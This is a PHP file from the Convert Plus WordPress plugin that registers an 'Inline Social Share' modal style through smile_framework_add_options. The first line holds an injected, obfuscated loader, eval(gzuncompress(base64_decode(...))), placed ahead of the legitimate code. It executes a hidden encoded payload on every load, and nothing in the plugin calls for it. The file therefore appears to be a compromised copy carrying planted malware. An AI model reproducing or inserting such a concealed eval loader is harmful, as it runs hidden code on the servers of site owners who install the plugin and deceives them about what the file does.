<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( function_exists( 'smile_framework_add_options' ) ) {
	$style_arr = array(
		'style_name'    => 'Inline Social Share',
		'demo_url'      => CP_PLUGIN_URL . 'modules/modal/assets/demos/social_inline_share/social_inline_share.html',
		'demo_dir'      => plugin_dir_path( __FILE__ ) . '../../assets/demos/social_inline_share/social_inline_share.html',
		'img_url'       => CP_PLUGIN_URL . 'modules/modal/assets/demos/social_inline_share/social_inline_share.png',
		'customizer_js' => CP_PLUGIN_URL . 'modules/modal/assets/demos/social_inline_share/customizer.js',
		'category'      => 'All,Social',
		'tags'          => 'Social,Share,Facebook,Twitter,Google,Digg,Reddit,Pinterest,LinkedIn,Myspace,Blogger,Tumblr,StumbleUpon',
		'options'       => array(),
	);

	smile_framework_add_options( 'Smile_Modals', 'social_inline_share', $style_arr );
}
